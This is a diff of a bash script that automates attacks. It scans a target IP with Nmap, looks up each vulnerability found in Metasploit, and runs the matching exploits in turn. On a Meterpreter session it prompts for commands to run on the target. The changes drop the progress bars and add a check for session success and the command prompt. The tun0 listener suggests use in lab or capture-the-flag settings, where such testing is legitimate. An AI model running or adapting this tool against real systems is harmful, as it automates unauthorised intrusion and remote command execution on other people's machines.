@@ -20,7 +20,6 @@ fi
 clear
 
 echo -e "\033[31m
-
  ██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
 ▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
  ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
@@ -125,7 +124,7 @@ else
 fi
 
 # Scan for vulnerabilities using Nmap
-echo -e "\e[32m[ INFO ] Vulnerability Scan Started \e[0m"
+echo -e "\e[32m[ INFO ] Vulnerability Scan Started... \e[0m"
 prev_percentage=-1
 
 if [ $lq = "l" ]
@@ -150,7 +149,6 @@ else
         fi
     done
 fi
-
 echo "\n"
 # Check if there are any open ports
 if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
@@ -175,24 +173,20 @@ exploit_executed=false
 session_id=""
 
 while read vuln; do
-    # Update the progress bar
-    count=$((count+1))
-    progress=$(echo "scale=2; $count/$total_vulns" | bc -l)
-    echo -ne "Progress ($progress%): [$count/$total_vulns] \r"
 
     # Search in Metasploit Framework
     echo "Searching in Metasploit Framework for $vuln..."
-    searchResults=$(msfconsole -q -x "search $vuln")
+    searchResults=$(msfconsole -q -x "search $vuln" < /dev/null 2>&1 &) 
     if [ -n "$searchResults" ]
     then
         # Extract the highest number in the # column
-        exploitCount=$(echo "$searchResults" | awk 'NR>3 { print $1 }' | sort -nr | head -1)
+        exploitCount=$(echo "$searchResults" | awk 'NR>3 && /^[0-9]+/ { print $1 }' | sort -nr | head -1)
         echo "Exploit Count: $exploitCount"
         if [[ "$exploitCount" =~ ^[0-9]+$ ]] && [ "$exploitCount" -gt 0 ]
         then
             # Use the first exploit found
             chosenExploits=$(echo "$searchResults" | awk 'NR>3 && $1 ~ /^[0-9]+$/ && $2 ~ /^exploit\// { print $2 }')
-
+            echo $chosenExploits
             # Split the chosenExploits into an array
             read -ra exploits <<< "$chosenExploits"
 
@@ -201,19 +195,25 @@ while read vuln; do
                 if [ "$exploit_executed" = false ]
                 then
                     echo "Using exploit $exploit"
-                    msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" 
-                    #sleep 10 # Wait for the exploit to execute
-                    if pgrep msfconsole | grep -q "Interact"
+                    output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null)
+                    # Check if exploit succeeded
+                    if echo "$output" | grep -q "Meterpreter session"
                     then
                         echo "Exploited vulnerability $vuln using exploit $exploit"
                         exploitsFound=1
                         exploit_executed=true
+                        
+                        # Prompt for user input
+                        read -p "Enter command to execute on target: " command
+                        msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; $command"
+                        
                         break 2 # break out of both loops when an exploit is successfully executed
                     else
                         echo "Failed to exploit vulnerability $vuln using exploit $exploit"
                     fi
                 fi
             done
+
 
             if [ "$exploitsFound" -eq 0 ]
             then
@@ -226,14 +226,7 @@ while read vuln; do
         echo "Search Results is empty"
     fi
 
-    # Update progress bar
-    percentage=$((count*100/total_vulns))
-    printf "["
-    for ((i=0; i<percentage; i+=2)); do printf "#"; done
-    for ((i=percentage; i<100; i+=2)); do printf " "; done
-    printf "] $percentage%%\r"
-
-    # Check if an exploit has been successfully executed
+        # Check if an exploit has been successfully executed
     if [ "$exploit_executed" = true ]
     then
         echo "Successfully exploited vulnerability $vuln. Opening shell..."
